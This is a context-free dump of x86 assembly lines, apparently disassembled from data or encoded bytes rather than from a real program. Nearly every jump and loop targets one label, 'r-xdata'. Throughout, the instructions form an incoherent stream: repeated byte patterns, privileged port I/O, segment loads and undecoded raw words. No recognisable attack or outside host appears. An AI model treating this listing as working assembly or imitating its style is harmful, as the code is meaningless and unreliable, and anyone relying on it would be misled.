and ah [ edx + 0x72727221 ]
adc edi edi
out 0xe2 al
adc eax 0x72e2e2e5
loop r-xdata
jb r-xdata
mov ch 0xb
or ah [ eax + 0x69e2e2f7 ]
cmp cl [ edx - 0x68ee9b7a ]
sbb bl [ 0x710a721d ]
mov es [ ebx + ebp * 2 + 0x2b0b3cb7 ]
jb r-xdata
jb r-xdata
in eax dx
cmp ah [ ecx + 0x26 ]
out dx al
cmp ebp ebp
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
popad
jb r-xdata
sbb eax 0x7c6bb11d
xor ah dl
or eax [ esi + ebx ]
mov cl [ ecx + 0xbd252b4 ]
js r-xdata
xor dl 0xe2
loop r-xdata
rcr [ 0x741da5b1 ] 0x1
dec esi
loop r-xdata
loop r-xdata
jb r-xdata
and eax 0xe3e2e5e2
retn 0xe2f9
or ecx [ edx ]
xor eax 0xbce2e2ed
and [ edx + 0x72 ] esi
loop r-xdata
mov ebx 0xbe01a61
push esp
cmpsb [ esi ] [ edi ]
loop r-xdata
mov dl 0x69
and al 0xa
jb r-xdata
or edx [ 0x72e2e2e5 ]
jpe r-xdata
loop r-xdata
jb r-xdata
out dx al
loop r-xdata
sub esp [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul edi [ edx ] 0x67ee2661
cmp ebp ebp
adc dh al
loop r-xdata
loop r-xdata
jb r-xdata
or ebp ebp
push ds
xchg [ esi - 0x4de21d72 ] cl
0x140b3a15 0xe2e1
loop r-xdata
mov ch 0x1d
xchg esi eax
mov eax [ 0x54edb2da ]
mov eax [ 0xffffffff911db2fc ]
mov edx 0xab52469
pop ss
or ah [ eax - 0x9 ]
loop r-xdata
push ebp
sbb eax 0x327c6bb1
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
mul bl
popad
add ch ch
or edx esi
salc
jb r-xdata
loop r-xdata
retn
and ch ch
into
lea edx [ edx + 0x12a7259b ]
jb r-xdata
mov [ edx + edx * 2 - 0x2187f42e ] esi
popad
popfd
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0xd4890e2 ] 0xb
ja r-xdata
jb r-xdata
jb r-xdata
popad
or eax [ es : ecx ]
out dx eax
sbb bl [ 0x111e66ed ]
imul ebx [ edx ] 0x6186b51d
or esp eax
or al [ eax + 0xbe2e2f2 ]
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
and eax 0x61b9bcbd
loop r-xdata
in eax dx
int3
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xc6961d1d
out dx al
or ecx edx
in al dx
loop r-xdata
sbb eax 0x69eac696
in eax 0xe2
push ss
fldenv [ 0xfffffffff7f866ed ]
loop r-xdata
or esi [ eax + 0xae2e2f4 ]
fwait
jb r-xdata
mov esp [ edx - 0x1dd9aae3 ]
fsubrp st2
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xc5cc0a1d
loop r-xdata
push ds
jb r-xdata
or esi [ edi + 0x1b ]
rcl [ ebx + ecx ] 0x1
loop r-xdata
jb r-xdata
imul esp esp 0xa
loop r-xdata
jb r-xdata
jb r-xdata
sbb bl [ 0x1a6186b5 ]
sbb eax 0x111e66ed
jb r-xdata
imul esi [ edi + 0xb9b88d2 ] 0xffffff82
shl dl cl
mov cl 0x1d
mov ah 0xa6
or edi [ edi + 0x72e2e2f9 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
mov al [ esi - 0x4a68ee9c ]
or eax [ esp + edx * 8 ]
mov dh ah
or ebp [ ebp + 0x72e2e2ed ]
mov bh 0x69
push cs
popad
push cs
retn 0xb4b1
xor bl [ bx ]
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
sbb cl [ eax + 0x6b84ba91 ]
cmpsd [ esi ] [ edi ]
and cl [ bp + di ]
mov bh 0xf2
or esi [ edi + 0x1b ]
jb r-xdata
or edx [ ecx ]
loop r-xdata
push esp
loop r-xdata
jb r-xdata
jb r-xdata
retn 0xe20b
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esi esi 0xffffffe2
jb r-xdata
jb r-xdata
jb r-xdata
rol dl 0xc0
jb r-xdata
and eax 0x8e861ea7
mov fs dx
sbb eax 0x3a159ab2
0xe2ec
sbb eax 0xfd0bb11d
cli
loop r-xdata
xor bl [ edi ]
jb r-xdata
retn 0x80cd
jb r-xdata
loop r-xdata
and eax 0x8d810ea7
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or dh [ ebp - 0x13 ]
jb r-xdata
jb r-xdata
jb r-xdata
adc al 0xb
mov bl 0xb3
or edx [ edx - 0x3c ]
jb r-xdata
loop r-xdata
imul edi [ edx ] 0xbf6bbbbb
push ds
jb r-xdata
jb r-xdata
or [ ebp - 0x58da646e ] 0x80cdc212
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
rol bh 0xb
jb r-xdata
loop r-xdata
imul esi [ edi - 0x48947b34 ] 0xffffffd2
mov [ ebx - 0x1d2d7df5 ] bl
add dl 0xb
loop r-xdata
push cs
or ecx [ edx - 0x19 ]
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int1
loopne r-xdata
lahf
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
fisub [ ecx + 0x7272e2e2 ]
jb r-xdata
and cl [ ebx ]
loop r-xdata
cmp ebp ebp
shl [ eax - 0x19771d1e ] cl
mov ebx 0x1ebf6bbb
jb r-xdata
imul ecx [ esi ] 0x520bb3b3
xchg edx eax
jb r-xdata
outsd
push esi
jb r-xdata
mov ah dl
shl dl cl
loop r-xdata
imul edi [ edi - 0x12c698e2 ] 0x66
shl [ eax - 0x19771d1e ] cl
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
jb r-xdata
stc
loop r-xdata
mov edi esp
loop r-xdata
fidivr [ edi - 0x324af40e ]
pop ds
jb r-xdata
jb r-xdata
and [ edx + 0x7272e2e2 ] 0x72
sbb bl [ 0xffffffffa76fb21d ]
push esi
jb r-xdata
jb r-xdata
in al 0xe2
loop r-xdata
cmpsd [ esi ] [ edi ]
outsd
jb r-xdata
outsd
loop r-xdata
mov edi 0xcdb50bf2
div edi
jne r-xdata
loop r-xdata
jb r-xdata
and eax 0xcdc212a7
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ecx [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
sbb eax 0xa76fb21d
jb r-xdata
jb r-xdata
xlat
jb r-xdata
mov bh 0x3e
jb r-xdata
push ds
jb r-xdata
jb r-xdata
in eax dx
mov dl ah
or ebp [ ebx - 0xa ]
mov esp 0x727221b9
mov [ esi - 0x48947b48 ] cl
adc al dl
jb r-xdata
imul esi [ edi - 0x68774788 ] 0xffffff84
jb r-xdata
and ch ch
jb r-xdata
loop r-xdata
jb r-xdata
and ch ch
mov bh 0xe4
loop r-xdata
mov dl 0x6f
push ds
sbb eax 0xea76fb2
retn 0xc7c0
and eax 0xc7c016a7
jb r-xdata
loop r-xdata
outsd
mov ch 0xe4
outsd
jb r-xdata
movsd [ edi ] [ esi ]
push ds
inc esp
jb r-xdata
mov eax 0xe2c9ad0b
mov [ edi + 0x7eb76b84 ] dl
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
or eax [ esp + edx ]
loop r-xdata
mov cl 0x1d
mov ah 0xae
jb r-xdata
mov ebx 0x721d1d19
jb r-xdata
or bh bh
or edx [ esi - 0x4 ]
jb r-xdata
jb r-xdata
jb r-xdata
int 0x80
jb r-xdata
in eax dx
js r-xdata
out dx ax
jb r-xdata
jb r-xdata
loop r-xdata
or ebp [ edi - 0x5a ]
jb r-xdata
sbb eax 0x741db21d
push cs
loop r-xdata
push ds
sbb eax 0xbb1b21d
outsd
sub bl [ bx ]
jb r-xdata
jb r-xdata
or edi [ ebx ]
pop ebp
in al dx
jb r-xdata
or eax [ eax + eax * 8 - 0x1e ]
mov ah 0xa
pop esp
loop r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
rol bh 0x8e
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
outsd
sbb eax 0x7272721d
jb r-xdata
add al 0x14
sbb dl cl
and al [ ebx + ebp * 2 + 0x676f18a7 ]
pop ds
test [ ebx - 0x59 ] ch
jb r-xdata
cld
jb r-xdata
loop r-xdata
or bl [ ebp - 0x14 ]
imul ebx [ edi + 0x1ea76ff2 ] 0xfc560bb2
jb r-xdata
sbb [ edi + 0x67 ] ch
jb r-xdata
and ah [ edx + 0x72212bbd ]
jb r-xdata
cmpsb [ esi ] [ edi ]
loop r-xdata
jb r-xdata
push ss
jb r-xdata
mov dh [ ebp - 0xf ]
retn
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov [ ebp + 0x78b76b84 ] ah
jb r-xdata
loop r-xdata
or ebp [ ebp - 0x121d1d37 ]
mov bh 0x7e
jb r-xdata
jb r-xdata
mov ss [ ecx - 0x3fe558db ]
jb r-xdata
retn
out dx eax
jb r-xdata
shl [ edx ] 0x1
mov [ 0x72212bbd ] al
xchg esp eax
jb r-xdata
outsd
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
mov ch 0xa

jb r-xdata
sbb eax 0xe33e0b1d
loop r-xdata
pop ds
loop r-xdata
imul esp [ ebx ] 0xe2c0440b
loop r-xdata
jb r-xdata
jb r-xdata
cmp al 0xae
loop r-xdata
sbb eax 0x2267aeb4
in eax dx
jb r-xdata
mul dl
loop r-xdata
or bh bh
or edx [ eax ]
retn 0xe2e2
loop r-xdata
cmpsd [ esi ] [ edi ]
0xe00be288 0xe2d7
shl dl 0xe2
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
push ds
cmpsd [ esi ] [ edi ]
push ss
popad
cmpsd [ esi ] [ edi ]
and eax 0xc2c01aa7
jb r-xdata
dec esi
jb r-xdata
std
and eax 0x8b9206a7
rcl eax 0x1
or edi ecx
sub cx [ ebx ]
jb r-xdata
jb r-xdata
imul ebx [ edi - 0x427b77f4 ] 0xb
jpe r-xdata
jb r-xdata
outsd
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov bl [ 0xffffffffb1e2e2e2 ]
jb r-xdata
jb r-xdata
xchg ecx eax
leave
loop r-xdata
jb r-xdata
mov eax 0x6b849788
mov bh 0x78
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
lodsd [ esi ]
jb r-xdata
jb r-xdata
sbb al al
jb r-xdata
loop r-xdata
loop r-xdata
in eax dx
jb r-xdata
loop r-xdata
jb r-xdata
push dx
jb r-xdata
jb r-xdata
sbb eax 0x9f6b84bd
loop r-xdata
or al 0x88
jb r-xdata
loop r-xdata
or eax [ ebx + 0x72e2e2a2 ]
jb r-xdata
mov dl 0xb
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xb1e2e2e2
jb r-xdata
ror [ ebx ] 0x1
stc
xchg [ ebx + eax * 4 - 0x6df958db ] dl
mov edx ecx
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
imul edi [ ebx ] 0xc4bf6b84
imul edi [ edx ] 0xe2ec760b
loop r-xdata
mov bh 0xec
pop edx
scasd [ edi ]
mov eax 0xdb84e2e2
imul esp [ edi - 0x2edd2ef2 ] 0x30
sbb bl [ 0xffffffffa45c0b1d ]
push edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebp - 0x1d0b85f5 ] bh
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push esi
in eax dx
loop r-xdata
push ds
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
and [ 0xffffffff8b9206a7 ] 0xffffffd1
jb r-xdata
pop esi
sbb cl dl
and al [ ebx + ebp * 2 - 0x4890e159 ]
mov edx 0x1aa76b84
mov [ ecx - 0x58947b46 ] dl
jb r-xdata
and ch ch
xchg si ax
mov edi 0xb3a69c4
jbe r-xdata
jb r-xdata
jb r-xdata
pop ecx
sbb bl [ 0xffffffffdea3691d ]
loope r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xa45c0b1d
jb r-xdata
jb r-xdata
sbb eax 0xe2a45c0b
jb r-xdata
mov edx 0x1aa76b84
shl [ edx ] 0x1
imul esp [ edi + 0x1eaf691e ] 0xb
jl r-xdata
push cs
shl [ edx ] 0x1
shl [ eax ] 0x1
popad
jb r-xdata
mov cl 0x1d
je r-xdata
and bh [ ebx + 0x1abf6bbb ]
loop r-xdata
jb r-xdata
or edi [ edx - 0xc ]
mov ah 0x8a
adc edi edi
mov esp [ edx - 0x1dd9aae3 ]
jb r-xdata
jb r-xdata
imul esi [ edi - 0x52f44782 ] 0xffffffc9
jb r-xdata
loop r-xdata
adc eax 0x72e2e2d3
jb r-xdata
sub ecx [ ebx ]
jb r-xdata
pop ds
sbb eax 0xf6170b1d
mov dh 0x1f
loop r-xdata
and eax 0x868302a7
jb r-xdata
jb r-xdata
sbb eax 0x3266ed72
stosd [ edi ]
and ebp ebp
jb r-xdata
loop r-xdata
or ebx [ esp - 0x1e ]
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
pop esp
jb r-xdata
0xca000be2 0xe2e2
jb r-xdata
jb r-xdata
loop r-xdata
sti
lahf
jb r-xdata
or dh [ esi + 0xb1d1d1f ]
pop ss
mul dl
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jle r-xdata
jb r-xdata
or bl [ ebx + ecx * 8 - 0x1e ]
loop r-xdata
test [ ebx - 0x59 ] ch
loop r-xdata
mov [ 0xffffffffe226551d ] al
in al dx
loop r-xdata
mov ebx 0x66ed2267
xchg esi eax
loop r-xdata
jb r-xdata
in eax dx
out 0xe3 al
loop r-xdata
or esi esp
sbb [ 0x66ed721d ] bl
xor ch [ ebx - 0x609e1d1e ]
movsb [ edi ] [ esi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax [ eax ]
0xe2e2
in eax dx
imul ebx [ edx ] 0xe2c6a70b
mov ah dh
jecxz r-xdata
loop r-xdata
jb r-xdata
cmp eax [ ebx + ebp * 2 + 0x3a69c4bf ]
or esi [ esi - 0x14 ]
sbb cl dl
or ebx [ ebx + 0x72e2e2de ]
jb r-xdata
sbb eax 0xa76116a7
mov cl 0xb
adc dl al
loop r-xdata
imul esp [ edi + 0xbe288ea ] 0xe2e2d7e0
jb r-xdata
sbb [ 0x2466ed1d ] bl
scasd [ edi ]
and ch ch
fsub st2
jb r-xdata
loop r-xdata
jecxz r-xdata
test bl bl
sbb eax 0xe2e25a74
jb r-xdata
or ebx [ esi ]
jb r-xdata
jb r-xdata
test cl bl
movsb [ edi ] [ esi ]
in al 0xb
adc [ ebx ] 0x1d
shl [ edx ] 0x1
mov ebx 0x1abf6bbb
sbb eax 0x6b84bd1d
lahf
in eax dx
push ebp
movsb [ edi ] [ esi ]
test [ ebx ] 0x94
pop ss
sbb eax 0xbb2721d
or ah ah
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xd6e00b1d
add dl cl
loop r-xdata
jb r-xdata

jb r-xdata
jb r-xdata
mov bh 0x69
jb r-xdata
loop r-xdata
loop r-xdata
salc
mov [ 0x1ea7e11a ] al
or edx [ esi ]
int1
loop r-xdata
pop ebp
out 0xe3 al
loop r-xdata
call 0x7328790f
jb r-xdata
loop r-xdata
imul ebp [ edi - 0x21549616 ] 0xe2d8650b
sub ebp ebp
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edx + 0x1ea7e11a ] 0xe2f1160b
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0xd1
cmp [ ebx ] ecx
sbb [ edi ] 0x1d
je r-xdata
jb r-xdata
jb r-xdata
scasd [ edi ]
push ds
or edi [ edx + edx * 8 - 0x1e ]
loop r-xdata
jb r-xdata
popad
imul esp [ edi + 0x14770b0e ] 0x1d
sbb eax 0x72727272
loop r-xdata
jb r-xdata
jb r-xdata
test ebx esp
loop r-xdata
push cs
jb r-xdata
xlat
jb r-xdata
movsd [ edi ] [ esi ]
loop r-xdata
jb r-xdata
loop r-xdata
push ebp
mov ch 0x6f
shl dl cl
loop r-xdata
jb r-xdata
sbb eax 0x3a1522f9
mov ah 0xa
cmpsd [ esi ] [ edi ]
jb r-xdata
mov cl 0x88
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0xfedf416 ] 0x971de2e2
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xlat
mov al ah
sbb eax 0x3a69eeb4
popad
loop r-xdata
cmpsd [ esi ] [ edi ]
push ds
imul ebp [ edi - 0x2d83f4e2 ] 0x7272e2e2
xor ch [ ebx - 0x609e1d1e ]
or eax [ edx - 0x6e2e2e1 ]
and dl [ 0xffffffffed212b3a ]
jb r-xdata
jb r-xdata
mov eax [ 0x7272e2e2 ]
jb r-xdata
sub ebp ebp
and dl [ ebx - 0x291ff4e3 ]
cmpsb [ esi ] [ edi ]
mov dl 0x6f
imul ebp [ edi - 0x4a4b4e16 ] 0x580b2b67
jb r-xdata
mov dl 0xb
mov ebx 0x72e2e2f1
mov ebp 0x21bc2469
mov bh 0xdd
jb r-xdata
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0xe2ddb70b
jb r-xdata
jb r-xdata
jb r-xdata
mov ah dl
loop r-xdata
mov bh 0x3e
or cl [ ecx - 0xd ]
jb r-xdata
imul edx [ edx ] 0xe2e3e65d
and ebp ebp
rcl [ edi ] 0x1
and cl [ ebx ]
or edx [ edx ]
jb r-xdata
jb r-xdata
mov ah 0xee
imul edi [ edx ] 0xb1d1961
push edi
stosd [ edi ]
loop r-xdata
loopne r-xdata
outsd
or ebx ebx
jb r-xdata
or ebp [ edi - 0x5 ]
0xe2f0120b 0x1de2
jb r-xdata
jb r-xdata
or ebx eax
aam 0xe2
loop r-xdata
jb r-xdata
loop r-xdata
pop ds
sbb eax 0x1522f91d
cmp ch [ ebx ]
jb r-xdata
hlt
loop r-xdata
mov ch 0x69
adc bl [ ebp - 0x1a ]
jecxz r-xdata
jb r-xdata
jb r-xdata
0x67b5b4b1 0xb2b
jb r-xdata
scasd [ edi ]
jb r-xdata
mov edx 0xe2d0dc0b
jb r-xdata
imul edi [ edi - 0x7bc29654 ] 0x6b
mov edi 0xf1bb0bb2
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
in eax 0xab
loop r-xdata
imul edi [ ebx ] 0xacbf6b84
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ edi + 0x72e2e2dd ]
jb r-xdata
loop r-xdata
fucomi st5
jb r-xdata
jb r-xdata
0xa76ba288 0xb16
outsd
cmpsd [ esi ] [ edi ]
sbb eax 0xd7670bb2
jb r-xdata
jb r-xdata
jb r-xdata
push esi
sbb bl [ 0x39d1b21d ]
outsd
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
leave
in al 0xc5
loop r-xdata
jb r-xdata
mov dl ah
sbb eax 0x1a699ab4
or esp [ edi + 0x72e2e2c6 ]
or ebp [ esi - 0x751d1d05 ]
jb r-xdata
in eax dx
jb r-xdata
adc dh al
jb r-xdata
cmpsd [ esi ] [ edi ]
and dh [ edx - 0x1df58ae3 ]
loop r-xdata
jb r-xdata
sbb edx eax
in eax dx
mov ebx 0xbe2e2e6
insd
fucom st2
loop r-xdata
sbb [ 0xffffffffe2ab570b ] ebx
loop r-xdata
loop r-xdata
jb r-xdata
imul esp [ edi - 0x457877d0 ] 0xb
jb r-xdata
imul ebx [ esi - 0x619e0d3a ] 0xffffffc6
stosb [ edi ]
mov ah 0xb5
jb r-xdata
pop eax
mov cl 0xb4
jb r-xdata
jb r-xdata
mov dl 0xb
mov edx 0x72e2e2cb
jcxz r-xdata
cmpsd [ esi ] [ edi ]
push ss
or edx [ edx + 0x72e2e2fb ]
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
mov bl 0x69
jb r-xdata
imul edi [ 0xffffffffb2bf6b84 ] 0xe2f1bb0b
test [ ebx - 0x41 ] ch
lodsb [ esi ]
jb r-xdata
jb r-xdata
loop r-xdata
fucom st2
jb r-xdata
jb r-xdata
jb r-xdata
mov al al
sub ebp ebp
jb r-xdata
0xe2e2
push ds
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
fcom st4
popad
fsub st2
loop r-xdata
or ebp [ edi ]
jb r-xdata
sbb eax 0x800b0697
loop r-xdata
jb r-xdata
imul ebx [ edi - 0x714be2e2 ] 0xffffffb5
or ebx esp
sub esp [ ecx ]
jb r-xdata
mov esp 0x72212bb9
jb r-xdata
test [ ebx - 0x41 ] ch
scasb [ edi ]
xor [ eax + 0x720bba87 ] cl
stc
loop r-xdata
jb r-xdata
xchg ecx eax
ror [ ebx ] cl
sub ecx [ bp + di ]
mov ch 0x67
sub ecx [ ebx ]
jb r-xdata
sbb eax 0x3232c69
out 0x69 eax
sbb al 0x23
jb r-xdata
loop r-xdata
or ebx [ eax - 0x56 ]
sahf
mov dl 0xed
add dl bl
loop r-xdata
loop r-xdata
imul edi [ edi - 0x7bc49652 ] 0x6b
popad
jb r-xdata
sbb cl [ ebx ]
and eax ebx
loop r-xdata
push ds
or cl cl
mov edi 0x843d69ac
imul edi [ edi - 0xe44f44e ] 0xffffffe2
jb r-xdata
sahf
popad
jb r-xdata
jb r-xdata
sub bx [ edx ]
sbb eax 0xb8af5a1d
loop r-xdata
loop r-xdata
imul edx [ edx ] 0xb41de288
0xa70b1a69 0xe2c6
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push es
or eax [ eax + 0x72e2e2ca ]
jb r-xdata
xchg edi eax
jb r-xdata
and dh ah
outsd
jb r-xdata
jb r-xdata
popad
loop r-xdata
mov [ edx + 0xb16a76b ] ah
xchg edx eax
sti
loop r-xdata
in eax dx
jb r-xdata
sbb eax 0x8c88721d
test [ ebx - 0x5a ] ch
test [ ebx - 0x59 ] ch
sbb eax 0x72727272
jb r-xdata
imul ecx [ esi ] 0xaf69b3b3
rcl [ ebx ] 0x1
jb r-xdata
pop esp
sub al 0x23
or esi [ ebp - 0x28 ]
loop r-xdata
xchg [ ebx + ebp * 2 + 0xbba04a7 ] al
fcom st0
loop r-xdata
outsd
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2c3230b
loop r-xdata
sbb edi esi
jb r-xdata

jb r-xdata
or edi [ edx + 0x1f ]
loop r-xdata
or ebx esp
shl dl 0x1
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jmp r-xdata
jb r-xdata
test eax 0xb40ea725
jb r-xdata
loop r-xdata
jb r-xdata
mov al [ 0xffffffffe2ca560b ]
jb r-xdata
jb r-xdata
jb r-xdata
into
jecxz r-xdata
mov edx 0x6b848688
cmpsd [ esi ] [ edi ]
or cl [ ecx - 0xd ]
and al 0xbc
jb r-xdata
test [ ebx - 0x41 ] ch
or bh [ edx - 0x40 ]
jb r-xdata
mov [ esi + 0x4a76b84 ] al
imul esp [ esp + edi * 4 ] 0x72727221
jb r-xdata
loop r-xdata
mov ch 0x69
adc cl [ eax - 0x654be21e ]
loop r-xdata
scasd [ edi ]
jb r-xdata
das
jb r-xdata
loop r-xdata
outsd
sti
sbb eax 0xe2e28a1d
loop r-xdata
lahf
push ds
sbb eax 0xbb58eb4
fcomp [ esi ]
mov ah cl
jb r-xdata
jb r-xdata
sbb edx ebx
and bh [ ebp + 0x212bb9bc ]
popad
sbb eax 0xe165edfb
loop r-xdata
je r-xdata
mov dh [ edi + 0x7 ]
push esi
jb r-xdata
or eax 0xed2de1e0
jb r-xdata
out 0xe2 eax
loop r-xdata
jb r-xdata
or edi [ edx + 0x72e2e2cb ]
and [ edx + 0x72 ] esi
jb r-xdata
push 0xffffffa7
jb r-xdata
mov esp 0x72727221
jb r-xdata
add al 0xba
test eax 0x14850bb4
and eax 0xafb40ea7
jb r-xdata
shl [ edx ] 0x1
mov ebp 0x212bb9bc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
or edi [ edi ]
out dx al
loop r-xdata
xchg edx eax
test [ ebx - 0x59 ] ch
adc [ edx + 0x6b84cc88 ] bh
push 0xffffffa7
outsd
scasd [ edi ]
or ch [ edi - 0x59 ]
dec edx
and eax 0xb4a90aa7
cmpsd [ esi ] [ edi ]
jb r-xdata
adc al 0x1d
sbb eax 0x848c8872
imul esp [ esi - 0x77455d3a ] 0xffffffe3
or eax [ edi + 0x721d1d0f ]
jb r-xdata
loop r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
sbb ch [ ebx - 0x59 ]
push ss
imul esp [ edi - 0x1d1da5e2 ] 0xffffffe2
loop r-xdata
loop r-xdata
jb r-xdata
imul esp [ edx + edx * 4 - 0x1d14b8f6 ] 0xffffffe2
loope r-xdata
jpe r-xdata
jb r-xdata
or bh [ ebx - 0x19 ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
mov cl 0xb1
outsd
jb r-xdata
jpo r-xdata
xor al [ ebx + ebp * 2 + 0x1b69deb7 ]
popad
out dx eax
loop r-xdata
in eax dx
push ebp
and dl al
or ebp [ eax + 0xae2e2fd ]
aas
in al dx
loop r-xdata
shl [ edx ] 0x1
mov ah 0xb5
inc eax
imul edi [ edi - 0xa09f4e2 ] 0xffffffe2
loop r-xdata
loop r-xdata
loop r-xdata
imul esi [ ebx ] 0x109f6b84
test [ ebx - 0x49 ] ch
fmul [ ebx ]
push esi
test [ ebx - 0x61 ] ch
adc ch [ ecx + 0x32 ]
test [ ebx - 0x49 ] ch
aas
jb r-xdata
xchg [ ecx + 0x1a ] ah
sbb eax 0x7272721d
jb r-xdata
int3
fsub st1
jb r-xdata
enter 0xe2e2 0x72
jb r-xdata
imul esi [ edx ] 0xdeb76b84
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
test eax 0x25a9afb4
cmpsd [ esi ] [ edi ]
push cs
mov ah 0xaf
jb r-xdata
0xe2e2
jb r-xdata
jb r-xdata
fisubr [ ecx + 0x1b ]
sahf
jb r-xdata
loop r-xdata
mov ch 0x6b
movsb [ edi ] [ esi ]
xchg edx eax
loop r-xdata
cmpsd [ esi ] [ edi ]
or edi [ edi ]
loope r-xdata
imul esi [ edi - 0x302ef412 ] 0x7272e2e2
jb r-xdata
loop r-xdata
cli
loop r-xdata
je r-xdata
jb r-xdata
and ch ch
dec ebx
jne r-xdata
pop es
and edx esp
loop r-xdata
loop r-xdata
outsd
loop r-xdata
jb r-xdata
or al [ edi - 0x15 ]
loop r-xdata
mov bl ah
outsd
jecxz r-xdata
jb r-xdata
sub eax 0xba013d1
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb al 0xc2
or esi [ edx + 0x721d1d10 ]
jb r-xdata
scasd [ edi ]
fsubrp st2
imul esp [ edi + 0xb22d10a ] 0x5f
imul esp [ edi + 0x16a76b1a ] 0x6b
cmpsd [ esi ] [ edi ]
push ds
pop edx
loop r-xdata
or ah ch
jb r-xdata
imul ecx [ esi ] 0xb1de0e61
in eax dx
loop r-xdata
ja r-xdata
or ecx [ 0x72e2e2a0 ]
loop r-xdata
or dh [ edx ]
or al 0x1d
sbb eax 0xbee2661
loop r-xdata
mov dl 0xed
push ebp
and cl [ ebx ]
xchg ebp eax
sbb [ 0x7272721d ] ebx
sbb eax 0x1e26676f
jb r-xdata
in eax dx
lodsb [ esi ]
sbb al 0x1d
sbb eax 0x72727272
jb r-xdata
popfd
out 0xe2 al
in eax dx
cwde
0x8661e2e2 0xc6c6
sbb eax 0xee26611d
popad
jb r-xdata
loop r-xdata
out dx eax
mov dl ah
mov ah 0xa
xor cl [ ebx - 0x11d99ee3 ]
or edx [ esi - 0x36 ]
loop r-xdata
loop r-xdata
mov dl 0x1d
mov ah 0x86
popad
sbb bl [ 0xffffffffeba167ed ]
loop r-xdata
adc esp [ eax - 0x1d35a9f5 ]
jb r-xdata
outsd
jb r-xdata
or edi [ ebx - 0x1e ]
loop r-xdata
mov ebx 0x67ed2267
imul ebx [ edi - 0x48947bf0 ] 0xffffffdc
or edx [ esi - 0x38 ]
loop r-xdata
jpo r-xdata
loop r-xdata
in eax 0x1b
sbb eax 0xa4e70b1d
sbb ebx [ 0xffffffffa4e70b1d ]
mov dl ah
sbb eax 0xed22671d
cli
loop r-xdata
mov dl 0x24
cmpsb [ esi ] [ edi ]
jb r-xdata
loopne r-xdata
dec dx
shl edx cl
loop r-xdata
push ds
or esi esi
cmc
loop r-xdata
mov dl 0x6f
push ds
sbb eax 0x880ab21d
aad 0xe2
loop r-xdata
push ds
jb r-xdata
jb r-xdata
out dx al
or ecx [ ecx + 0x1f ]
sbb eax 0x7272721d
and cl [ bp + di ]
add bl dl
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
imul ebx [ ebx ] 0x6b843369
imul ebx [ edi - 0x7bcd96ee ] 0x6b
mov bh 0xde
mov eax [ 0xffffffffffffe2eb ]
